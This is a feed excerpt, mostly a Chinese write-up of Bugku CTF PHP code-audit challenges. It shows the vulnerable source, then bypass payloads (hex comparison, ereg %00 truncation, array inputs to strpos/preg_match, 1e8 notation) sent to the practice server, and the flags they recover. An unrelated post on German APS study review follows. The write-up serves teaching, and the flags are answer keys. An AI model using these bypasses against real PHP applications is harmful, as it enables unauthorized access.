&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;$i&lt;/span&gt; = 0; &lt;span&gt;$i&lt;/span&gt; &amp;lt; &lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$number&lt;/span&gt;); &lt;span&gt;$i&lt;/span&gt;++&lt;span&gt;)
{
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Disallow all the digits!&lt;/span&gt;
&lt;span&gt;$digit&lt;/span&gt; = &lt;span&gt;ord&lt;/span&gt;(&lt;span&gt;$temp&lt;/span&gt;{&lt;span&gt;$i&lt;/span&gt;&lt;span&gt;});
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( (&lt;span&gt;$digit&lt;/span&gt; &amp;gt;= &lt;span&gt;$one&lt;/span&gt;) &amp;amp;&amp;amp; (&lt;span&gt;$digit&lt;/span&gt; &amp;lt;= &lt;span&gt;$nine&lt;/span&gt;&lt;span&gt;) )
{
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Aha, digit not allowed!&lt;/span&gt;
&lt;span&gt;return&lt;/span&gt; &quot;flase&quot;&lt;span&gt;;
}
}
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;$number&lt;/span&gt; == &lt;span&gt;$temp&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;$temp&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; noother_says_correct(&lt;span&gt;$temp&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;利用双等于号&quot;==&quot;可以对不同进制的数比较来构造payload&lt;/p&gt;
&lt;p&gt;代码审计需要满足两个条件：1. if ( ($digit &amp;gt;= $one) &amp;amp;&amp;amp; ($digit &amp;lt;= $nine) ) ==》 FALSE     // password的值里面不能包含数字1-9，‘3735929054' 转化为十六进制 0xdeadc0de 碰巧里面的字符都没在1-9里面&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　2. if($number == $temp) ==》 TRUE   //十进制和十六进制之间的比较&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/20.php?password=0xdeadc0de&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
flag{Bugku-admin-ctfdaimash}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第十题：变量覆盖&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 变量覆盖?????  怎么感觉像是服务器被覆盖了！！！！！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第十一题：ereg正则%00截断&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt; 知识简介&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ereg()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
int &lt;span&gt;ereg&lt;/span&gt; ( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$pattern&lt;/span&gt; , &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$string&lt;/span&gt; [, &lt;span&gt;array&lt;/span&gt; &amp;amp;&lt;span&gt;$regs&lt;/span&gt;&lt;span&gt; ] )

以区分大小写的方式在 &lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt; 中寻找与给定的正则表达式 pattern 所匹配的子串。 

如果找到与 pattern 中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 regs，则匹配项将被存入 regs 数组中。&lt;/span&gt;&lt;span&gt;$regs&lt;/span&gt;[1] 包含第一个左圆括号开始的子串，&lt;span&gt;$regs&lt;/span&gt;[2] 包含第二个子串，以此类推。&lt;span&gt;$regs&lt;/span&gt;[0&lt;span&gt;] 包含整个匹配的字符串。 

如果在 &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; 中找到 pattern 模式的匹配则返回所匹配字符串的长度，如果没有找到匹配或出错则返回 &lt;span&gt;FALSE&lt;/span&gt;。如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1。 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;strlen()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
int &lt;span&gt;strlen&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$string&lt;/span&gt;&lt;span&gt;)

返回给定的字符串 &lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt; 的长度。 

参数 

&lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt;
需要计算长度的字符串。 

返回值 

成功则返回字符串 &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; 的长度；如果 &lt;span&gt;string&lt;/span&gt; 为空，则返回 0。 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;strpos()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;strpos&lt;/span&gt;&lt;span&gt; — 查找字符串首次出现的位置

int &lt;/span&gt;&lt;span&gt;strpos&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$haystack&lt;/span&gt;, &lt;span&gt;mixed&lt;/span&gt; &lt;span&gt;$needle&lt;/span&gt;[, int &lt;span&gt;$offset&lt;/span&gt; = 0&lt;span&gt;] )

返回 needle 在 haystack 中首次出现的数字位置。 


参数 

haystack
在该字符串中进行查找。 
needle
如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。 
offset
如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。 


返回值 

返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。 

如果没找到 needle，将返回 &lt;/span&gt;&lt;span&gt;FALSE&lt;/span&gt;。 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;题目信息&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/5.php&quot;&gt;http://123.206.87.240:9009/5.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215224102752-523887328.png&quot; alt=&quot;&quot; width=&quot;305&quot; height=&quot;450&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;$flag&lt;/span&gt; = &quot;xxx&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;]))
{
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;ereg&lt;/span&gt; (&quot;^[a-zA-Z0-9]+$&quot;, &lt;span&gt;$_GET&lt;/span&gt;['password']) === &lt;span&gt;FALSE&lt;/span&gt;&lt;span&gt;)
{
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&lt;span&gt;

You password must be alphanumeric

&lt;/span&gt;'&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['password']) &amp;lt; 8 &amp;amp;&amp;amp; &lt;span&gt;$_GET&lt;/span&gt;['password'] &amp;gt; 9999999&lt;span&gt;)
{
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;strpos&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['password'], '-') !== &lt;span&gt;FALSE&lt;/span&gt;) &lt;span&gt;//&lt;/span&gt;&lt;span&gt;strpos — 查找字符串首次出现的位置&lt;/span&gt;
&lt;span&gt;{
&lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('Flag: ' . &lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;);
}
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
{
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt;('&lt;span&gt;
- have not been found

&lt;/span&gt;'&lt;span&gt;);
}
}
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
{
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&lt;span&gt;
Invalid password

&lt;/span&gt;'&lt;span&gt;;
}
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;题目代码有误(也不知道是怎么个回事 mmp)，正确代码应该是：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;])) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;ereg&lt;/span&gt; (&quot;^[a-zA-Z0-9]+$&quot;, &lt;span&gt;$_GET&lt;/span&gt;['password']) === &lt;span&gt;FALSE&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;You password must be alphanumeric&amp;lt;/p&amp;gt;'&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['password']) &amp;lt; 8 &amp;amp;&amp;amp; &lt;span&gt;$_GET&lt;/span&gt;['password'] &amp;gt; 9999999&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;strpos&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['password'], '*-*') !== &lt;span&gt;FALSE&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('Flag: ' . &lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        {
            &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt;('&amp;lt;p&amp;gt;*-* have not been found&amp;lt;/p&amp;gt;'&lt;span&gt;);
        }
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
    {
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;Invalid password&amp;lt;/p&amp;gt;'&lt;span&gt;;
    }
&lt;br/&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;利用strlen()函数和strpos()函数不能处理数组进行构造payload&lt;/p&gt;
&lt;p&gt;或&lt;/p&gt;
&lt;p&gt;利用ereg()函数的%00截断漏洞进行构造payload&lt;/p&gt;
&lt;p&gt;代码审计需要满足三个条件：1. if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET['password']) === FALSE)  ==》 FLASE&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　2. if (strlen($_GET['password']) &amp;lt; 8 &amp;amp;&amp;amp; $_GET['password'] &amp;gt; 9999999)    //正常感觉矛盾，但是可以利用科学计数法绕过1e8 &amp;gt; 9999999&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　3. if (strpos ($_GET['password'], '*-*') !== FALSE)   //password的值应包含字符串 '*-*'&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/5.php?password=1e8%00*-*&lt;/span&gt;
&lt;span&gt;
http&lt;/span&gt;:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/5.php?password[]=&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
Flag: flag{bugku-dm-sj-a12JH8}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;第十二题：strpos数组绕过&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;chal-value text-center&quot;&gt;&lt;span&gt;&lt;strong&gt; 知识简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;chal-value text-center&quot;&gt;strpos()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;strpos&lt;/span&gt;&lt;span&gt; — 查找字符串首次出现的位置

int &lt;/span&gt;&lt;span&gt;strpos&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$haystack&lt;/span&gt;, &lt;span&gt;mixed&lt;/span&gt; &lt;span&gt;$needle&lt;/span&gt;[, int &lt;span&gt;$offset&lt;/span&gt; = 0&lt;span&gt;] )

返回 needle 在 haystack 中首次出现的数字位置。 


参数 

haystack
在该字符串中进行查找。 
needle
如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。 
offset
如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。 


返回值 

返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。 

如果没找到 needle，将返回 &lt;/span&gt;&lt;span&gt;FALSE&lt;/span&gt;。 
&lt;/pre&gt;&lt;/div&gt;

&lt;p class=&quot;chal-value text-center&quot;&gt;&lt;span&gt;&lt;strong&gt;题目信息&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215231019288-392929476.png&quot; alt=&quot;&quot; width=&quot;256&quot; height=&quot;233&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;$flag&lt;/span&gt; = &quot;flag&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['ctf'&lt;span&gt;])) {
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (@&lt;span&gt;ereg&lt;/span&gt; (&quot;^[1-9]+$&quot;, &lt;span&gt;$_GET&lt;/span&gt;['ctf']) === &lt;span&gt;FALSE&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '必须输入数字才行'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;strpos&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['ctf'], '#biubiubiu') !== &lt;span&gt;FALSE&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('Flag: '.&lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
&lt;span&gt;echo&lt;/span&gt; '骚年，继续努力吧啊~'&lt;span&gt;;
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 利用strpos()函数不能处理数组进行构造payload&lt;/p&gt;
&lt;p&gt;代码审计需要满足两个条件：1. if (@ereg (&quot;^[1-9]+$&quot;, $_GET['ctf']) === FALSE) ==》 FALSE&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　2. if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE) ==》 TRUE&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/15.php?ctf[]=&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
Flag: flag{Bugku-D-M-S-J572}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;第十三题：数字验证正则绕过&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;chal-value text-center&quot;&gt;&lt;strong&gt;&lt;span&gt;知识简介&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;preg_match()函数学习：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
int &lt;span&gt;preg_match&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$pattern&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$subject&lt;/span&gt;[, &lt;span&gt;array&lt;/span&gt; &amp;amp;&lt;span&gt;$matches&lt;/span&gt;[, int &lt;span&gt;$flags&lt;/span&gt; = 0[, int &lt;span&gt;$offset&lt;/span&gt; = 0&lt;span&gt;]]] )

搜索subject与pattern给定的正则表达式的一个匹配&lt;/span&gt;.&lt;span&gt; 

参数 
pattern
要搜索的模式，字符串类型。 
subject
输入字符串。 
matches
如果提供了参数matches，它将被填充为搜索结果。 &lt;/span&gt;&lt;span&gt;$matches&lt;/span&gt;[0]将包含完整模式匹配到的文本， &lt;span&gt;$matches&lt;/span&gt;[1&lt;span&gt;] 将包含第一个捕获子组匹配到的文本，以此类推。 
flags
flags可以被设置为以下标记值： 
PREG_OFFSET_CAPTURE
如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。注意：这会改变填充到matches参数的数组，使其每个元素成为一个由第0个元素是匹配到的字符串，第1个元素是该匹配字符串在目标字符串subject中的偏移量。 
offset
通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于指定从目标字符串的某个位置开始搜索(单位是字节)。 

返回值 
&lt;/span&gt;&lt;span&gt;preg_match&lt;/span&gt;()返回 pattern 的匹配次数。它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后将会停止搜索。&lt;span&gt;preg_match_all&lt;/span&gt;()不同于此，它会一直搜索subject 直到到达结尾。如果发生错误preg_match()返回 &lt;span&gt;FALSE&lt;/span&gt;。 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;题目信息&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/21.php&quot;&gt;http://123.206.87.240:9009/21.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215234941808-1575598160.png&quot; alt=&quot;&quot; width=&quot;303&quot; height=&quot;389&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;error_reporting&lt;/span&gt;(0&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;$flag&lt;/span&gt; = 'flag{test}'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&quot;POST&quot; == &lt;span&gt;$_SERVER&lt;/span&gt;['REQUEST_METHOD'&lt;span&gt;])
{
&lt;/span&gt;&lt;span&gt;$password&lt;/span&gt; = &lt;span&gt;$_POST&lt;/span&gt;['password'&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (0 &amp;gt;= &lt;span&gt;preg_match&lt;/span&gt;('/^[[:graph:]]{12,}$/', &lt;span&gt;$password&lt;/span&gt;)) &lt;span&gt;//&lt;/span&gt;&lt;span&gt;preg_match — 执行一个正则表达式匹配&lt;/span&gt;
&lt;span&gt;{
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; 'flag'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (&lt;span&gt;TRUE&lt;/span&gt;&lt;span&gt;)
{
&lt;/span&gt;&lt;span&gt;$reg&lt;/span&gt; = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (6 &amp;gt; &lt;span&gt;preg_match_all&lt;/span&gt;(&lt;span&gt;$reg&lt;/span&gt;, &lt;span&gt;$password&lt;/span&gt;, &lt;span&gt;$arr&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;$c&lt;/span&gt; = 0&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;$ps&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;('punct', 'digit', 'upper', 'lower'); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母&lt;/span&gt;
&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;$ps&lt;/span&gt; &lt;span&gt;as&lt;/span&gt; &lt;span&gt;$pt&lt;/span&gt;&lt;span&gt;)
{
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;preg_match&lt;/span&gt;(&quot;/[[:&lt;span&gt;$pt&lt;/span&gt;:]]+/&quot;, &lt;span&gt;$password&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;$c&lt;/span&gt; += 1&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;$c&lt;/span&gt; &amp;lt; 3) &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;&amp;gt;=3，必须包含四种类型三种与三种以上&lt;/span&gt;
&lt;span&gt;if&lt;/span&gt; (&quot;42&quot; == &lt;span&gt;$password&lt;/span&gt;) &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; 'Wrong password'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;&lt;span&gt;;
}
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;利用preg_match()函数不能处理数组进行构造payload&lt;/p&gt;
&lt;p&gt;代码审计需要满足一个条件：1. if (0 &amp;gt;= preg_match('/^[[:graph:]]{12,}$/', $password)) ==》 TRUE&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/21.php&lt;/span&gt;
&lt;span&gt;
post&lt;/span&gt;: password[]=
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
flag{Bugku_preg_match}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;第十四题：简单的waf&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;和第十题(变量覆盖)一样，题目打不开！！！！！ *-*　　　　　　　　　　　&lt;/p&gt;

</description>
<pubDate>Fri, 15 Feb 2019 16:05:00 +0000</pubDate>
<dc:creator>Pretty_girll</dc:creator>
<og:description>第一题：extract变量覆盖 知识简介 extract()函数语法： 题目信息 Topic Link：http://123.206.87.240:9009/1.php 利用extract()函数的变</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/prettygirll/p/10386536.html</dc:identifier>
</item>
<item>
<title>APS审核经验+审核资料汇总——计算机科学与技术专业上海德语审核 - Rest探路者</title>
<link>http://www.cnblogs.com/Java-Starter/p/10385600.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Java-Starter/p/10385600.html</guid>
<description>&lt;h2&gt;1.APS是什么&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;德国驻华使馆文化处留德人员审核部&lt;/strong&gt;（简称APS）成立于2001年7月，是由德国驻华使馆文化处和德意志学术交流中心（DAAD）在北京共同合作成立的服务机构。&lt;/p&gt;
&lt;p&gt;APS是中国学生前往德国留学的大门，它的主要职责是对有意赴德留学的中国学生（不包含来自香港、澳门和台湾的学历）进行资格审核。&lt;/p&gt;
&lt;p&gt;申请德国留学的申请人在获得APS证书和德国大学的录取通知书后，可通过APS递交签证申请&lt;/p&gt;

&lt;p&gt;简单地说，通过APS审核后，即半只脚踏入了德国，获得了攻读德国硕士的前提条件&lt;/p&gt;
&lt;p&gt;APS审核一生只有三次机会，请君慎重&lt;/p&gt;
&lt;h2&gt;2.APS审核资料汇总&lt;/h2&gt;
&lt;p&gt;本科期间学习了68门课程，我集中整理了20门课程（包括毕业设计）以应对APS审核，德语专业词汇均在维基百科上查阅，实在没查到的专业词汇我则用英语代替。&lt;/p&gt;
&lt;p&gt;我以专业课（计算机专业课程）和基础课程（大物、高数、线代和概率论等）为主，选修课舍弃之&lt;/p&gt;
&lt;h3&gt;2.1 德语审核资料&lt;/h3&gt;
&lt;p&gt;配两张思维导图（中文版和德文版）&lt;/p&gt;
&lt;p&gt;我按照20篇博客列举的课程大纲，黄色的星代表次优先级的科目，绿色虚线表示学科间交叉关系&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215200136361-3145545.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215200229869-1834184661.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_0&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9800875.html&quot;&gt;Entwurfsmuster&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（设计模式）&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_1&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9800864.html&quot;&gt;WEB Front-end Development Technology&lt;/a&gt;（WEB前端开发技术）&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_2&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9800811.html&quot;&gt;Objekt Orientierte Programmierung C++&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（面向对象编程C++）&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_3&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9779368.html&quot;&gt;Datenbanksystem&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（数据库系统）&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_4&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9772448.html&quot;&gt;Rechnernetz&lt;/a&gt;（计算机网络）&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_5&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9759617.html&quot;&gt;Diskrete Mathematik&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（离散数学）&lt;/span&gt;&lt;/p&gt;

